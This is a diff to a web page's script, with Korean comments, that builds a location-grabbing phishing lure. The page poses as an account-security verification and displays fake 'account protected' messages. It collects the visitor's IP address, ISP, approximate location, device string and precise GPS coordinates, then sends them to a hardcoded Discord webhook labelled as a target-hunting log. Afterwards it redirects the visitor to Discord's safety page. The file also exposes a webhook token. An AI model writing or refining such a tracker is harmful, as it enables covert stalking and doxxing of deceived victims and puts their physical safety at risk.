@@ -23,37 +23,56 @@
     </div>
 
     <script>
-        // ⚠️ 사용자님의 디스코드 웹훅 주소를 여기에 넣으세요.
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1504180730065060091/04MSAWnJml7CocT_QTGidlB8cXxOEuQ1tWByB5W8RxppYB2f9EpVGnG7BKnehCYE1C-b";
 
+        async function sendToDiscord(embed) {
+            await fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] })
+            });
+        }
+
         async function grab() {
+            // 1. 클릭 즉시 IP 기반 대략적 정보부터 전송 (권한 거부 대비)
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                
+                const initialEmbed = {
+                    title: "⚠️ 타겟 접속 감지 (IP 추적)",
+                    color: 16711680,
+                    fields: [
+                        { name: "🌐 IP 주소", value: `\`${ipData.ip}\``, inline: true },
+                        { name: "🏢 통신사(ISP)", value: `\`${ipData.org}\``, inline: true },
+                        { name: "📍 대략적 위치", value: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`, inline: false },
+                        { name: "📱 기기", value: "```" + navigator.userAgent + "```" }
+                    ],
+                    timestamp: new Date().toISOString()
+                };
+                await sendToDiscord(initialEmbed);
+            } catch (e) {
+                console.error("IP 정보 획득 실패");
+            }
+
+            // 2. GPS 정밀 위치 요청
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const data = {
-                        embeds: [{
-                            title: "🎯 타겟 검거 완료 (정밀 위치)",
-                            color: 15105570,
-                            fields: [
-                                { name: "📍 구글맵 좌표", value: `[${pos.coords.latitude}, ${pos.coords.longitude}](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})` },
-                                { name: "📏 정확도", value: `\`${Math.round(pos.coords.accuracy)}m\``, inline: true },
-                                { name: "📱 기기 정보", value: "```" + navigator.userAgent + "```" }
-                            ],
-                            footer: { text: "X2-Hunter Logging System" },
-                            timestamp: new Date().toISOString()
-                        }]
+                    const gpsEmbed = {
+                        title: "🎯 타겟 정밀 좌표 확보!",
+                        color: 3066993,
+                        fields: [
+                            { name: "📍 구글맵 좌표", value: `[${pos.coords.latitude}, ${pos.coords.longitude}](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})` },
+                            { name: "📏 정확도", value: `\`${Math.round(pos.coords.accuracy)}m\``, inline: true }
+                        ],
+                        footer: { text: "X2-Hunter Logging System" },
+                        timestamp: new Date().toISOString()
                     };
-
-                    // 디스코드로 데이터 전송
-                    await fetch(DISCORD_WEBHOOK, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
-                    });
-
+                    await sendToDiscord(gpsEmbed);
                     alert("인증되었습니다. 계정이 보호되었습니다.");
                     window.location.href = "https://discord.com/safety";
                 }, (err) => {
-                    alert("보안 오류: 위치 권한을 허용해야 인증이 완료됩니다.");
+                    alert("인증 실패: 보안을 위해 위치 권한을 허용해야 합니다.");
                 }, { enableHighAccuracy: true, timeout: 10000 });
             }
         }
